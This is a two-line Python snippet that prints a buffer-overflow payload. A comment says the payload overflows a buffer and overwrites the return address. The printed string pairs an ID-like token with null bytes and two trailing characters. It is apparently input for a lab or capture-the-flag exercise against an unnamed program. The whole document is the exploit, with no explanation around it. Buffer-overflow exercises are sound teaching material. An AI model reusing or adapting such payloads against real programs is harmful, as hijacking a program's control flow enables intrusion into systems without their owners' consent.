# overflows the buffer and overwrites the return address
print("u1182994\0\0A+")
